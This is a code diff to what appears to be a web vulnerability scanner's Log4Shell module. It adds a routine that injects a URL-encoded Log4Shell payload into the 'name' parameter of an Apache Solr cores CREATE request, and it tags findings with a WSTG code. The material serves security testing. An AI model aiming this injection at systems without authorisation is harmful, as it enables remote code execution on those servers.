@@ -27,6 +27,7 @@ class ModuleLog4Shell(Attack):
 
     VSPHERE_URL = "websso/SAML2/SSO"
     DRUID_URL = "druid/coordinator/v1/lookups/config/"
+    SOLR_URL = "solr/admin/cores"
 
     def __init__(self, crawler, persister, attack_options, stop_event):
         Attack.__init__(self, crawler, persister, attack_options, stop_event)
@@ -62,6 +63,26 @@ class ModuleLog4Shell(Attack):
             self.network_errors += 1
             return
         await self._verify_header_vulnerability(malicious_request, header_target, payload, payload_unique_id)
+
+
+
+    async def attack_apache_solr_url(self, request_url: str):
+        payload_unique_id = uuid.uuid4()
+        payload = self._generate_payload(payload_unique_id).replace("{", "%7B").replace("}", "%7D")
+        query = f"action=CREATE&name={payload}&wt=json"
+
+        malicious_request = Request(
+            path=request_url + "?" + query,
+            method="GET",
+            get_params=None,
+        )
+
+        try:
+            await self.crawler.async_send(malicious_request, follow_redirects=True)
+        except RequestError:
+            self.network_errors += 1
+            return
+        await self._verify_param_vulnerability(malicious_request, payload_unique_id, "name")
 
     async def _attack_apache_struts(self, request_url: str):
         payload_unique_id = uuid.uuid4()
@@ -110,6 +131,7 @@ class ModuleLog4Shell(Attack):
             await self._attack_vsphere_url(vsphere_request)
             await self._attack_apache_struts(request.url)
             await self._attack_apache_druid_url(current_url + self.DRUID_URL)
+            await self.attack_apache_solr_url(current_url + self.SOLR_URL)
         await self._attack_vsphere_url(request)
 
     async def attack(self, request: Request):
@@ -207,7 +229,8 @@ class ModuleLog4Shell(Attack):
             request=request,
             info=_("URL {0} seems vulnerable to Log4Shell attack") \
                 .format(request.url),
-            parameter=""
+            parameter="",
+            wstg=WSTG_CODE
         )
 
         log_red("---")
